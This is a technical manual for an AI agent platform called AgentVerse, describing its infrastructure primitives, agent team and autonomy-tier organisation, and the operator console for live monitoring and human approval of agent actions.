Orientation

This chapter collects the cross-cutting infrastructure that the goal lifecycle depends on but that does not belong to any single step: the provider abstraction, the reliability primitives (bulkheads, breakers, dedup, rollback), the persistence and messaging layers, the schedulers, and the external integration boundaries. None of it is glamorous; all of it is the difference between a system that demos and one that stays up.

The recurring theme is isolation and idempotency: every shared resource is bounded per tenant so one cannot starve another, and every side-effecting operation is made safe to repeat so that retries — which are constant in a distributed agent system — do not double-charge, double-send, or double-file.

The primitives

01MCP registry and clients#

ShippedIntegrationImpl9/10Criticality9/10

The Model Context Protocol is the platform's device-driver layer: tools live in their own processes behind a uniform protocol, registered per tenant, so the tool surface is configuration and a bad connector cannot take the agent down.

Mechanism

A per-tenant registry holds connector definitions; the client discovers tools (tools/list) and executes them (call_tool) over HTTP or WebSocket, wrapped in circuit breakers, caches, and credential resolution. Connectors are certified before use, can be imported from OpenAPI specs, and support agent-to-agent (A2A) calls. The 325 built-in server modules cover common integrations; tenants add their own.

In AgentVerse

  • app/mcp/registry.py, client.py, ws_client.pyregistry and clients
  • app/mcp/catalog.py, capability_search.pydiscovery
  • app/mcp/certification.py, certification_manifest.pyconnector certification
  • app/mcp/openapi_importer.pyimport tools from an OpenAPI spec
  • app/mcp/a2a.py, app/agent/tools/a2a_call.pyagent-to-agent calls
  • app/mcp/servers/325 built-in server modules

Worked example

tenant adds a connector from an OpenAPI spec
 openapi_importer → tool definitions → certification (mocked probes)
 registered per tenant → discoverable by that tenant's agents only
 call_tool wraps each invocation in a breaker + cache + vault credential
one connector crashing affects only its own calls, not the agent process

At production scale

Process isolation per connector is the property that makes a large tool ecosystem safe: a connector with a memory leak, a hang, or a crash degrades only its own tool, and the breaker routes around it. Certification before use catches the connector that returns malformed results before an agent trusts it. Full treatment of the call path in chapter 19.

Failure modes

  • Uncertified connectors. Malformed results trusted by agents.
  • Cross-tenant tool visibility. One tenant's connector reachable by another.

Choose it when

  • Any agent that integrates with external systems.

02Provider abstraction#

ShippedAbstractionImpl9/10Criticality9/10

One interface for every LLM and embedding backend, resolved from env keys at startup, with a deterministic fake for tests — the abstraction that makes the platform genuinely vendor-neutral.

Mechanism

A common protocol (CompletionRequest, Message, EmbedRequest) covers completion and embedding; concrete providers implement it and are auto-detected from configured API keys. The registry resolves the right provider per request; the fake provider gives deterministic output with no keys. This is what lets cross-provider verification, provider fallback, and per-role routing exist at all — they all depend on the backends being interchangeable.

In AgentVerse

  • app/providers/base.pyCompletionRequest, Message (hub nodes), EmbedRequest, the protocol
  • app/providers/registry.pyresolve_provider() — auto-detection
  • app/providers/anthropic_provider.py, openai_compatible.py, gemini_provider.py, voyage_provider.py, ollama_provider.py, nvidia_nim_provider.py, openrouter_provider.pybackends
  • app/providers/fake.pyFakeProvider
  • app/providers/vault.pyencrypted credential store

Worked example

startup  ANTHROPIC_API_KEY and OPENAI_API_KEY set
 registry auto-detects both → available for routing
 no keys → FakeProvider only → the whole stack runs in CI deterministically
one CompletionRequest shape → any backend answers it → the router chooses
which, the loop does not know or care

At production scale

Vendor neutrality is not idealism here — it is the precondition for the reliability and cost features elsewhere in the book. Cross-provider consensus needs two real providers; fallback needs a second backend; per-role routing needs a choice. The deterministic fake is what makes the whole platform testable without keys or network. Full treatment in chapters 7 and 16.

Failure modes

  • Leaky abstraction. Vendor specifics reaching calling code.
  • No fake. Tests that need keys and network.

Choose it when

  • Always. Single-vendor deployments still need it for testing and fallback.

03Bulkheads, breakers, deduplication, idempotency#

ShippedReliabilityImpl8/10Criticality10/10

The four primitives that keep a distributed agent system from taking itself down: bounded per-tenant concurrency, breakers on flaky dependencies, dedup of repeated work, and idempotency so retries are safe.

Mechanism

Bulkhead: a per-tenant concurrency ceiling, so one tenant's fan-out cannot exhaust the shared worker pool or connection pool. Circuit breaker: after repeated failures on a dependency, stop calling it and fail fast (or serve stale) until it recovers. Deduplication: recognise a repeated request and return the prior result rather than re-doing it. Idempotency: derive a key from goal+step+arguments so a retried write is recognised as the same write, not a new one.

In AgentVerse

  • app/reliability/bulkhead.pyper-tenant concurrency
  • app/reliability/circuit_breaker.py, redis_circuit_breaker.pybreakers (in-process and cross-replica)
  • app/reliability/dedup.py, app/services/dedup.pydeduplication
  • app/reliability/idempotency.pyidempotency keys
  • app/reliability/result_processor.pysanitize/redact/truncate tool output

Worked example

bulkhead     acme capped at 50 concurrent tool calls → a 200-way fan-out
             queues rather than exhausting the pool → other tenants unaffected
breaker      the CRM connector fails 5× → open → fail fast for 60s → half-open
             probe → recovered → close
dedup        the same read issued twice in one goal → second served from cache
idempotency  a retried "create invoice" carries the same key → recognised,
             not duplicated → the customer is billed once

At production scale

These four are what separate a system that survives failure from one that amplifies it. Idempotency in particular is non-negotiable for an agent that writes — retries are constant, and without idempotency keys a retried "send invoice" sends three. The bulkhead is the ceiling that no amount of enthusiastic spawning (chapter 1) can breach. Full treatment in chapter 28.

Failure modes

  • Retry without idempotency. Duplicate side effects.
  • No bulkhead. One tenant's fan-out starving the fleet.
  • Per-replica breaker only. The fleet not learning a dependency is down.

Choose it when

  • Always. This is production reliability, not an add-on.

04Rollback and compensating actions#

ShippedReliabilityImpl8/10Criticality9/10

When a multi-step goal fails partway, the rollback engine applies registered inverses in LIFO order to undo the side effects — so a failed goal leaves no half-built state for a human to untangle.

Mechanism

For each executed tool that has a registered inverse (create→delete, grant→revoke, post→retract), the executed action and its inverse are recorded. On terminal failure, the rollback engine walks the executed actions in reverse order and applies each inverse. Actions with no inverse — you cannot un-send an email — are classified as irreversible and gated behind approval before they run (chapter 1).

In AgentVerse

  • app/reliability/rollback.pyRollbackEngine — LIFO compensation
  • app/reliability/tool_inverses.pythe inverse registry
  • app/memory/execution.pythe record of what was executed
  • app/recovery/*failure classification that triggers rollback

Worked example

goal fails at step 4
 executed  1 create epic  2 create sub-tasks  3 post to slack
 rollback (LIFO)  3 delete slack msg → 2 delete sub-tasks → 1 delete epic
 result   the goal failed cleanly; no orphaned records
step 3 had been "send external email" → no inverse → it would have been
gated behind approval before running

At production scale

Rollback is the feature most agent frameworks lack and the one that makes write-capable agents trustworthy. The pairing that matters: classify tools by compensability as well as risk, and put the irreversible ones behind HITL. A failed rollback (the inverse itself fails) is a human ticket, never a silent swallow. Full treatment in chapter 1.

Failure modes

  • Missing inverses. Nothing to compensate with.
  • Rollback failure swallowed. Half-undone state, unreported.
  • Irreversible actions ungated. Damage that cannot be undone.

Choose it when

  • Any agent that writes to systems of record.

05Postgres, pgvector, and RLS#

ShippedPersistenceImpl9/10Criticality10/10

One database is the filesystem, the vector store, and the tenant boundary at once — Postgres with pgvector holds documents, chunks, memory, goals, and audit, and row-level security enforces isolation underneath all of it.

Mechanism

SQLAlchemy 2 async over asyncpg, models per domain, migrations via Alembic (~44 revisions). Vectors live in pgvector columns alongside their metadata, so filtered vector search is one query. RLS policies filter every row by app.tenant_id. Keeping vectors, metadata, and relational data in one transactional store is what makes filtered retrieval, joins, and tenant isolation simple — the alternative (a separate vector database) turns every filtered query into a cross-system join.

In AgentVerse

  • app/db/models/one file per domain (24 model modules)
  • app/db/migrations/Alembic revisions
  • app/db/rls.pythe isolation enforcement
  • app/db/session.pyasync session factory
  • app/core/pools.pyconnection pooling (pgbouncer in the full stack)

Worked example

one query does isolation + scope + filter + ANN (chapter 6)
 SELECT ... WHERE tenant_id = current_setting('app.tenant_id')
   AND collection_id = ANY($1) AND metadata->>'jurisdiction' = 'DE'
   ORDER BY embedding <=> $2 LIMIT 50
no cross-system join, one transaction, RLS as the backstop

At production scale

The decision to keep everything in Postgres rather than adding a dedicated vector store is a deliberate simplification: transactions, joins, and RLS come for free, and pgvector is good enough for the scale most tenants reach. The migration discipline — never edit a deployed migration, always add a new one — is what keeps a 44-revision history deployable. Full treatment of the vector index in chapter 4.

Failure modes

  • Editing deployed migrations. Divergent schemas across environments.
  • Connection exhaustion. No pooling under fan-out load.
  • RLS bypassed by raw connections. A leak path (chapter 13).

Choose it when

  • The default persistence choice; revisit only at very large vector scale.

06Redis: pub/sub, cache, locks, checkpoints#

ShippedMessagingImpl9/10Criticality9/10

Redis is the platform's nervous system: it carries goal events across replicas, holds the cost counters and breaker state that must be shared, provides distributed locks, and backs the agent checkpointer.

Mechanism

Five distinct uses. Pub/sub delivers goal events from workers to the API for SSE. Cache holds semantic-cache and tool-result entries. Atomic counters hold cost budgets so accounting is accurate across replicas. Locks ensure one worker per goal. Checkpoints store agent state so goals survive worker restarts. Each is a case where the state must be shared across processes, which is exactly what Redis is for.

In AgentVerse

  • app/net/redis_factory.pyconnection management
  • app/services/goal_service.pypub/sub bridge
  • app/governance/cost.pyatomic cost counters
  • app/reliability/distributed_lock.py, redis_circuit_breaker.pylocks and shared breaker state
  • app/agent/graph.pyAsyncRedisSaver checkpointer

Worked example

one goal touches Redis five ways
 pub/sub    goal_events:acme:g-8891 → API → browser SSE
 cache      retrieval result served from semantic cache
 counter    INCRBY on cost:goal:g-8891 (atomic across workers)
 lock       lock:goal:g-8891 held by worker-4
 checkpoint agent state after each node → resume on restart

At production scale

Redis is what makes the platform horizontally scalable: workers are stateless because state lives in Redis and Postgres, so you add workers to add capacity. It is also a single point of failure to plan around — the checkpointer falls back to sync Redis then to in-memory, and the cost counters and locks need Redis to be highly available. Full treatment in chapters 11 (events) and 32 (scaling).

Failure modes

  • Redis as SPOF. Its outage stalling budgets, locks, and events.
  • Unbounded cache growth. No TTL or eviction.
  • Lock without expiry. A dead worker holding a goal forever.

Choose it when

  • Any multi-replica deployment.

07Celery and per-plan queues#

ShippedScalingImpl9/10Criticality9/10

The scheduler: goals, scheduled runs, and maintenance tasks run as Celery jobs, routed to per-plan queues so tenant tiers are isolated and enterprise tenants avoid noisy neighbours.

Mechanism

Celery workers pull from queues named by plan tier; a routing map sends each goal to its tenant's queue. Beat schedules periodic work — firing due triggers, ingestion syncs, memory consolidation, maintenance. A beat guard prevents duplicate beat schedulers. Task types cover goal execution, scheduled goals, and maintenance, each with its own concurrency and retry policy.

In AgentVerse

  • app/scaling/celery_app.pyPLAN_QUEUE_MAP, queue routing
  • app/scaling/tasks.pyrun_goal, run_scheduled_goal, fire_due_schedules, maintenance
  • app/scaling/beat_guard.pyone beat scheduler
  • app/scaling/priority_queue.py, parallel_executor.pypriority and parallelism

Worked example

PLAN_QUEUE_MAP  free→goals.free · starter→goals.starter · … · enterprise→…
 a free tenant submits 10,000 goals → they queue on goals.free
 an enterprise tenant's goal → goals.enterprise, drained by dedicated workers
 → the enterprise goal is not stuck behind the free backlog
beat fires due schedules, ingestion syncs, memory consolidation on cron

At production scale

Per-plan queue routing is the single most important multi-tenant scaling decision. Without it, tier differentiation is a lie — a premium tenant's latency is at the mercy of whoever submitted the biggest batch. With it, you scale workers per queue to match the SLA you sold. Full treatment in chapter 32.

Failure modes

  • Single queue. Noisy-neighbour latency.
  • Duplicate beat. Schedules firing twice.
  • No per-queue scaling. Workers idle on one tier, saturated on another.

Choose it when

  • Any multi-tenant async platform with tiers.

08Triggers and schedules#

ShippedSchedulingImpl8/10Criticality8/10

Agents that nobody typed a prompt into: cron schedules, webhooks, data-change events, and IoT signals that submit goals automatically, with natural-language scheduling on top.

Mechanism

A trigger is a source (cron, webhook, data change, IoT sensor, message queue) bound to a goal template. When it fires, it submits a goal on the tenant's behalf, subject to the same auth, budget, and governance as any other goal. Natural-language scheduling parses "every weekday at 9am, summarise overnight incidents" into a trigger spec. Webhooks are verified and rotated; triggers are rate-limited, deduplicated, and bulkheaded like any other work.

In AgentVerse

  • app/triggers/nl_scheduler.pyNL → TriggerSpec
  • app/triggers/store.py, models.pyScheduleStore, TriggerSpec, TriggerType
  • app/triggers/dispatcher.py, consumers/*dispatch and consumption
  • app/triggers/webhooks/verifier.py, rotation.pywebhook security
  • app/triggers/iot/*, data/consumers.pyIoT and data-change triggers
  • app/scaling/tasks.pyfire_due_schedules

Worked example

"every weekday at 9am, summarise overnight incidents and post to #ops"
 nl_scheduler → TriggerSpec(cron="0 9 * * 1-5", goal_template=..., channel=...)
 beat fires it → submits a goal as the tenant → runs the normal lifecycle
webhook trigger: a payment.failed webhook (verified) → submits a triage goal

At production scale

Triggers turn a request/response agent platform into an autonomous one, and they carry the same risks amplified: an unbounded trigger is a self-inflicted load spike, and a trigger that fires with stale authorisation acts on behalf of someone who may no longer be authorised. Rate-limit, deduplicate, and re-check authorisation at fire time. Full treatment in chapter 27.

Failure modes

  • Unbounded triggers. A load spike nobody scheduled.
  • Unverified webhooks. Attacker-submitted goals.
  • Stale authorisation. Firing on behalf of a departed user.

Choose it when

  • Any event-driven or scheduled autonomous work.

09Marketplace and templates#

PartialPlatformImpl7/10Criticality6/10

A gallery of goal templates, agent configurations, and workflows — so a tenant starts from a proven pattern (GST filing, AML screening, invoice processing) rather than a blank page.

Mechanism

Templates package a goal or workflow with its recommended patterns, tools, collections, and guardrails. The marketplace catalogs them by domain; a tenant instantiates one and customises it. This is how domain expertise is distributed — a template for GST return filing encodes the steps, the validation, and the HITL gates that a finance team would otherwise have to discover. Monetisation lets template authors be compensated.

In AgentVerse

  • app/enterprise/marketplace.py, marketplace_v2.pythe gallery
  • app/api/marketplace_monetization.pymonetisation
  • app/content/marketplace/the template content (insurance, banking, GST, government, cybersecurity…)
  • app/content/goal_templates/goal templates (HR, software, devops, sales, legal…)
  • app/workflow/templates/workflow templates (AML screening, KYC, invoice processing)

Worked example

tenant wants GST return filing
 instantiate the GST-filing template → comes with:
   plan pattern, gst.* tools, tax-policy collection, HSN validation,
   filing HITL gate, consensus for the filing action
 customise thresholds → run
weeks of setup replaced by a proven, governed starting point

At production scale

Templates are how a horizontal platform serves vertical needs: the 40+ marketplace domains and goal templates encode the workflows that make the platform immediately useful to a finance, HR, or security team. The governance is baked in — a template ships with the right gates — which is both a selling point and a safety property. Templates must be versioned and certified like any other configuration (chapter 10).

Failure modes

  • Uncertified templates. A shared config that has not passed evals.
  • Stale templates. Encoding a workflow the domain has since changed.

Choose it when

  • Serving common vertical workflows to non-expert tenants.

10RPA and browser automation#

PartialAutomationImpl7/10Criticality6/10

When a system has no API, drive its UI: an agent authenticates, navigates, and extracts using a real browser, with credentials injected out of the model's sight and every step captured for debugging.

Mechanism

A browser session (Playwright) authenticates with vault credentials injected at the browser layer, navigates via DOM analysis (falling back to vision), and acts. Sessions are managed and reused; successful selectors are remembered (visual memory, chapter 3); artifacts (screenshots, traces) are captured for debugging. It is brittle by nature, so it is instrumented heavily and reserved for systems with no API.

In AgentVerse

  • app/rpa/executor.py, runner.py, session.py, session_manager.pythe automation engine
  • app/rpa/credential_injector.pycredentials injected without model exposure
  • app/rpa/artifacts.pyscreenshots and traces
  • app/perception/browser_agent.py, page_analyzer.pypage analysis

Worked example

government tax portal, no API
 session authenticates (credentials injected at the browser, not the prompt)
 DOM analysis finds the filing form → fills → submits
 screenshots per step retained 7 days for debugging
 remembered selectors make the next run fast
UI change → extraction shape changes → alert, not a silent wrong result

At production scale

RPA is a bridge, not a strategy — it breaks whenever the target UI changes, so it is reserved for legacy and government systems with no other access. The credential-injection-at-the-browser-layer design is the security-critical part: the model drives the browser but never sees the password. Full treatment in chapter 5 (RPA extraction) and chapter 15 (screenshots).

Failure modes

  • UI change → silent wrong extraction. Validate the shape.
  • Credentials in the prompt or a screenshot. Inject at the browser, redact captures.

Choose it when

  • No API exists and the data matters. Never when an API does.

11External integration boundaries#

ShippedBoundaryImpl8/10Criticality9/10

Every point where the platform touches the outside world — connectors, webhooks, channels, egress — is a boundary that must authenticate, validate, rate-limit, and treat what comes back as untrusted.

Mechanism

The boundaries: outbound tool calls (MCP), inbound webhooks (verified and rate-limited), interaction channels (Slack, Teams, email, WhatsApp, Discord, Telegram, voice), and any HTTP egress (SSRF-guarded). Each applies the same discipline: authenticate the counterparty, validate the payload, rate-limit, and treat inbound content as untrusted data subject to injection scanning. The channels layer turns the platform into something reachable where users already are, not just an API.

In AgentVerse

  • app/gateway/channels/*slack, teams, email, whatsapp, discord, telegram, voice, webhook
  • app/gateway/webhook_delivery.py, router.pydelivery and routing
  • app/net/ssrf_guard.pyegress protection
  • app/integrations/slack/, zapier/, email/integration handlers
  • app/agent/exfil_guard.pyinbound content treated as untrusted

Worked example

inbound: a Slack message "reconcile March payouts"
 channel verifies the Slack signature → resolves the tenant + user
 → submits a goal (same auth, budget, governance as an API submission)
 → streams progress back to the thread
outbound: a web fetch → SSRF guard blocks internal addresses → content
 scanned for injection before it influences the agent

At production scale

The channels are how the platform meets users where they are — Slack and email are where work actually happens — and each is a new authentication and injection surface. The discipline is uniform: an inbound message is a goal submission subject to every control, and inbound content is untrusted. SSRF protection on every egress is the boundary that stops an agent being turned into a proxy into your own network.

Failure modes

  • Unverified inbound channels. Anyone submitting goals as anyone.
  • Egress without SSRF guard. The agent as an internal-network proxy.
  • Channel content trusted. Injection through a Slack message.

Choose it when

  • Any integration inbound or outbound — so all of them.

What is missing here

  • Connector health SLAs. Breakers protect against failure, but there is no per-connector SLA tracking that would let a tenant know a connector is chronically unreliable.
  • A vector-store abstraction. pgvector is assumed; very large deployments would benefit from a pluggable vector backend behind the same interface.
  • Template certification pipeline. Templates exist; a required "certified against evals before listing" gate is thinner than it should be (chapter 10).
  • Cross-region active-active. Redis and Postgres are assumed regional; a multi-region story for residency-split tenants is future work (chapter 32).

AI agent teams

Departments, roles, team formation, autonomy tiers, org learning.

Orientation

The patterns in chapter 1 coordinate agents for the duration of one goal. This chapter is about something more persistent: standing teams of agents organised like a company — departments, roles, reporting lines, autonomy levels, and shared organisational memory — that exist across goals and learn as an organisation, not just as individuals.

The distinction matters because a team is a governance object, not just an execution pattern. A department has a budget, a memory scope, an autonomy tier, and an accountability structure; forming one is closer to hiring than to spawning. AgentVerse implements this in two related layers: the org layer (departments, roles, team formation) and the more experimental civilization layer (long-lived agent societies with reputation and a constitution).

The org layer

01Departments and roles#

PartialStructureImpl7/10Criticality6/10

Agents are organised into departments with roles, mirroring a company — so a goal routes to the department that owns its domain, and access follows the org structure.

Mechanism

A department groups agents by business function (finance, engineering, support) with a role taxonomy (analyst, approver, lead) that maps to permissions and to what each agent may do. Department scope bounds memory (chapter 3) and knowledge access, so finance agents share finance context and do not see engineering's. The structure is data, so an organisation can be reshaped without code.

In AgentVerse

  • app/org/roles.py, role_taxonomy.py, rbac.pyroles and permissions
  • app/org/service.py, models.py, schemas.pythe org model
  • app/memory/dept_memory.pydepartment-scoped memory
  • app/org/knowledge_access.pyorg-structured knowledge access

Worked example

Finance department
 roles     analyst (submit/read), approver (act on approvals), lead (admin)
 agents    invoice-agent, reconcile-agent, forecast-agent
 memory    acme/finance/* — shared across the three, invisible to support
 access    the tax-policy collection, the ERP connector
a "reconcile payouts" goal routes here; a "triage this bug" goal routes to Eng

At production scale

Department structure is what most enterprises actually want and what most agent frameworks lack — a middle scope between "one global agent" and "isolated per-agent". It makes a new agent useful immediately (it inherits the department's memory and access) and it makes access reviewable along familiar org lines.

Failure modes

  • Scope creep. Department memory promoted to global "because it's useful".
  • Orphaned departments. A reorg leaving memory with no owner.

Choose it when

  • Multiple agents serve distinct business functions.

02Team formation#

PartialFormationImpl7/10Criticality6/10

For a goal too big for one agent or one department, a formation engine assembles a team from the capability registry — picking agents whose skills cover the goal and defining how they coordinate.

Mechanism

The formation engine reads the goal's requirements, queries the capability registry for agents that can cover them, and produces a team manifest: which agents, what each is responsible for, and the coordination pattern (supervisor, debate, group chat). It is the meta-agent idea (chapter 9) applied to teams — natural language in, a governed team configuration out, reviewed before it runs.

In AgentVerse

  • app/org/team_formation.pyTeamFormationEngine, TeamManifest
  • app/org/capability_registry.pywhat each agent can do
  • app/capabilities/registry.py, resolver.pycapability resolution
  • app/org/meta_orchestrator.pyorchestrates the formed team

Worked example

goal "investigate and remediate the checkout latency regression"
 formation engine → capability registry query
 team manifest
   obs-agent    (metrics, traces)      lead
   code-agent   (diff deploys)
   db-agent     (slow-query analysis)
   coordination: supervisor (obs-agent leads, synthesises)
reviewed → runs as a coordinated team, not three unrelated goals

At production scale

Team formation is powerful and needs the same guardrails as spawning: a cap on team size, a budget split across members, and review before a formed team acts on real systems. Its value is matching capability to need automatically; its risk is a formed team that is larger and more expensive than the goal warranted.

Failure modes

  • Oversized teams. More agents than the goal needs.
  • Capability mismatch. An agent on the team lacking the tool the manifest assumed.
  • Unreviewed formation. A team acting without approval.

Choose it when

  • Goals span capabilities no single agent has.

03Meta-orchestration#

PartialCoordinationImpl7/10Criticality7/10

The layer above departments: routes goals to the right department or team, coordinates cross-department work, and manages the org-scale equivalent of the agent loop.

Mechanism

The meta-orchestrator handles goals that need more than one department — "prepare the board pack" touches finance, product, and risk. It decomposes across departments, routes each part to the owning team, monitors progress, and synthesises. It is the supervisor pattern (chapter 1) lifted to the organisational level, with departments as the units instead of individual agents.

In AgentVerse

  • app/org/meta_orchestrator.pycross-department orchestration
  • app/org/decision_intelligence.pyorg-level decisions
  • app/org/goal_refinement.pyshaping a goal before decomposition
  • app/org/workflow_steps.pyorg workflow steps
  • app/org/failure_manager.py, loop_detector.pyorg-level failure and loop control

Worked example

goal "prepare the Q3 board pack"
 meta-orchestrator decomposes across departments
   Finance   → financial results
   Product   → metrics
   Risk      → risk assessment
 each department runs its part with its own agents and memory
 meta-orchestrator synthesises into one pack, with cross-links

At production scale

Meta-orchestration is where the org model earns its complexity: cross-functional work that no single department owns. It also inherits every risk of multi-agent coordination amplified — loop detection and failure management at the org level exist because an org of agents can deadlock or spiral just as a team can. Keep the same caps and budgets that bound spawning (chapter 1).

Failure modes

  • Cross-department deadlock. Two departments waiting on each other.
  • Synthesis loss. Rich department output flattened.
  • Unbounded org-level fan-out. Cost blowout across departments.

Choose it when

  • Goals genuinely span multiple business functions.

04Autonomy tiers#

PartialGovernanceImpl7/10Criticality8/10

How much an agent or department may do without a human — from supervised (every action gated) to bounded-autonomous (act within limits) to autonomous (act freely within scope) — set per department and enforced by the runtime.

Mechanism

An autonomy tier determines the default gating: supervised agents route every consequential action to a human; bounded-autonomous agents act within budget and risk limits, escalating only above them; autonomous agents act freely within their scope. The tier is a governance setting, not an agent choice, and it interacts with tool risk — even an autonomous agent's destructive actions are gated (chapter 13).

In AgentVerse

  • app/org/autonomy.pyautonomy tiers
  • app/agent/pattern_config.pyautonomy_mode on the goal config
  • app/org/quality_gates.pygates that scale with autonomy
  • app/org/approval_chain.pythe approval path for supervised work

Worked example

tier             behaviour
supervised       every write gated → finance dept during quarter close
bounded          act ≤ $50 and ≤ risk medium, escalate above → support triage
autonomous       act freely within scope, destructive still gated → internal
                 docs maintenance
a new department starts supervised and earns autonomy as it proves reliable

At production scale

Autonomy tiers are how you deploy agents at all: start supervised, measure reliability, and raise the tier as trust is earned — the same way you would with a new employee. The invariant that survives every tier is that irreversible and destructive actions are gated regardless; autonomy governs the reversible middle, not the dangerous extremes.

Failure modes

  • Autonomy without earned trust. A new agent acting freely before it is proven.
  • Tier overriding tool risk. An autonomous agent's destructive action ungated.

Choose it when

  • Deploying agents that take real actions — set the tier deliberately.

05Organisational learning#

PartialImprovementImpl7/10Criticality6/10

A team learns as an organisation: lessons, preferences, and procedures accumulate at the department and org level, so the whole team benefits from any member's experience.

Mechanism

Org learning aggregates individual agents' lessons (chapter 3) into department- and org-scoped memory, with the same corroboration and decay discipline. A procedure discovered by one finance agent becomes available to all finance agents; a preference learned about a stakeholder is shared across the department. It is memory-assisted improvement (chapter 9) lifted from the individual to the organisation.

In AgentVerse

  • app/org/org_learning.py, self_improvement.pyorg-level learning
  • app/org/context_engine.pyorg durable context
  • app/org/analytics.py, metrics.pyorg-level measurement
  • app/org/digital_twin.pya model of the org for simulation

Worked example

invoice-agent learns "the CFO wants variance explanations over 5%"
 → promoted to finance department memory (corroborated across runs)
 → reconcile-agent and forecast-agent now apply it too
one agent's lesson becomes the department's standard, without a deploy

At production scale

Org learning is how a team of agents compounds experience rather than each agent relearning in isolation. It carries the same risks as individual memory amplified — a bad lesson now affects a whole department — so the corroboration bar and the scope boundaries matter more, not less. The digital twin is the interesting frontier: simulating org decisions before making them.

Failure modes

  • Premature promotion. One agent's mistake becoming department doctrine.
  • Cross-department leakage. Finance lessons surfacing in engineering.

Choose it when

  • A team of agents shares a domain and should compound experience.

06Agent societies and civilization#

PartialFrontierImpl6/10Criticality4/10

The experimental frontier: long-lived agent societies with membership, reputation, a shared constitution, and a blackboard — agents that persist and interact over time rather than assembling per goal.

Mechanism

The civilization layer models a persistent society: agents are members with reputation earned through outcomes; a constitution encodes inviolable principles; a governor enforces them; a blackboard and a bus enable communication; goals route by reputation and capability. It is a research-grade exploration of what happens when agents are durable citizens rather than ephemeral workers — closer to a multi-agent simulation than to the production loop.

In AgentVerse

  • app/civilization/society.pySociety — membership, reputation, routing
  • app/civilization/constitution.py, governor.pyConstitution and Governor
  • app/civilization/orchestrator.py, spawn_tool.pyorchestration and spawning
  • app/civilization/blackboard.py, bus.py, a2a_dispatch.pycommunication
  • app/civilization/learning.py, metrics.pysociety-level learning and metrics

Worked example

a persistent society of agents
 members earn reputation from successful goals
 a new goal routes to high-reputation members with matching capability
 the constitution forbids certain actions; the governor enforces
 agents communicate via the blackboard, not point-to-point
this is exploratory: durable agent citizens, not per-goal workers

At production scale

Rated low on both axes deliberately: the civilization layer is a genuine research direction, not a production workhorse. Its ideas — reputation-based routing, a machine-enforced constitution, persistent societies — are where multi-agent systems may go, but for production work the bounded team and department model above is what earns its keep. It is included because it is real code and a real part of the platform, and because it names the frontier honestly.

Failure modes

  • Emergent misbehaviour. Persistent agents developing unintended dynamics.
  • Reputation gaming. Agents optimising reputation over outcomes.
  • Unbounded society growth. Cost with no clear owner.

Choose it when

  • Research into persistent multi-agent systems.
  • Not for production workloads — use bounded teams.

What is missing here

  • Team eval and certification. Individual agents are evaluated; a formed team's effectiveness as a unit is harder to measure and not systematically gated.
  • Cross-department budgets. Budgets are per-goal and per-tenant; a department-level budget with its own accounting is thin.
  • Reputation grounded in evals. The civilization reputation signal is not yet tied to the eval scores that would make it trustworthy.
  • Org-structure change management. Reshaping departments is possible but there is no migration flow for the memory and access that move with them.

Jervis (JARVIS) console

The operator cockpit: design tokens, live streams, human control.

Concepts
6
Mean impl
8.0
Mean criticality
8.0
Shipped
4
Thin / missing
0

Orientation

"Jervis" — the JARVIS-style console — is the operator's cockpit: the React frontend through which a human submits goals, watches them execute live, approves gated actions, inspects memory and traces, and steers the fleet. It is named for the Iron Man AI because the design language is deliberately that — a dark, instrument-panel aesthetic with a boot sequence, live telemetry, and spring-based motion — but the substance is a serious piece of information design over a complex backend.

The reason it earns a chapter: an agent platform is only as governable as its console makes it. Every control in the safety and governance chapters (HITL approval, emergency stop, policy, budgets, audit) is only real if a human can see it and act on it in time. The console is where the abstract controls become operable, and its design decisions — a shared design-token system, live SSE streams, human-in-the-loop surfaces — are architecture, not decoration.

The console

01The design-token system#

ShippedDesign systemImpl8/10Criticality6/10

One source of truth for colour, motion, and spacing — the electric-cyan-on-slate JARVIS palette expressed as tokens, so 60+ feature pages look like one product rather than sixty.

Mechanism

Design tokens define the palette (electric #00D4FF, semantic emerald/amber/rose/violet, a five-level surface hierarchy, text tiers), spring-motion presets (never duration/ease), and glow tiers, synced with CSS variables. Every page imports the tokens rather than hardcoding values, so a palette change is one edit. The JARVISPageShell wraps each page with consistent entrance motion, spacing, and accessibility (aria-live, focus management, reduced-motion).

In AgentVerse

  • agent-verse-frontend/src/lib/design/tokens.tscolours, shadows, tw helpers, spec-aligned token map
  • agent-verse-frontend/src/lib/design/motion.tsspring presets
  • agent-verse-frontend/src/components/ui/JARVISPageShell.tsxthe page wrapper
  • agent-verse-frontend/src/components/ui/JARVISBootScreen.tsxthe startup sequence

Worked example

tokens   electric #00D4FF · surfaces #020408→#2D3748 · text #F1F5F9/#94A3B8
motion   SPRING_PAGE {stiffness 280, damping 26} — springs, never durations
shell    every page: blur-in entrance, staggered children, aria-live region,
         useReducedMotion fallback
change the accent once in tokens.ts → the whole console updates

At production scale

A token system is what keeps a large, fast-moving frontend coherent — the alternative is sixty pages that drift apart as different people build them. The accessibility built into the shell (reduced-motion, focus, aria-live) is not optional for a console operators use all day, and baking it into the wrapper means every new page inherits it rather than re-implementing it. (This manual's own design borrows the same electric accent, honouring the project's existing system.)

Failure modes

  • Hardcoded colours. Pages that drift from the system.
  • Duration-based motion. The inconsistent feel springs avoid.
  • Accessibility per-page. Inconsistent, often forgotten.

Choose it when

  • Any frontend beyond a handful of pages.

02Live goal execution view#

ShippedLive viewImpl9/10Criticality9/10

The heart of the console: watch a goal plan, call tools, and verify in real time over SSE — so an operator sees what the agent is doing, not just its final answer.

Mechanism

The goal detail page subscribes to the goal's SSE stream (chapter 11) and renders each event as it arrives: the plan appearing, steps executing, tool calls, verifier verdicts, replans, and completion. Because events flow through Redis pub/sub, the view is continuous even across worker restarts, and a reconnecting client can resume. This is the surface that makes agent execution legible rather than a black box that returns a result minutes later.

In AgentVerse

  • agent-verse-frontend/src/features/goals/GoalDetailPage.tsxthe live view
  • agent-verse-frontend/src/lib/sse/useGoalStream.tsthe SSE hook
  • agent-verse-frontend/src/features/goals/adaptiveResult.tsadaptive result rendering per connector
  • app/services/goal_service.pythe backend event source

Worked example

operator opens goal g-8891
 live: "planned (5 steps)" → "executing step 1" → "tool: gst.fetch_filed"
       → "waiting for your approval: file amendment" → [operator approves]
       → "executing step 4" → "verified" → "completed"
the operator watched the agent work and approved the one action that
needed a human — the whole point of the console

At production scale

The live view is what turns "the AI did something" into "I watched the AI do it and approved the risky step". It is the difference between a system operators trust and one they fear. The SSE-over-Redis design (chapter 11) is what makes it robust: the operator is connected to the API, not to the worker, so the view survives the fleet churn that is constant in production.

Failure modes

  • Result-only view. No visibility into execution.
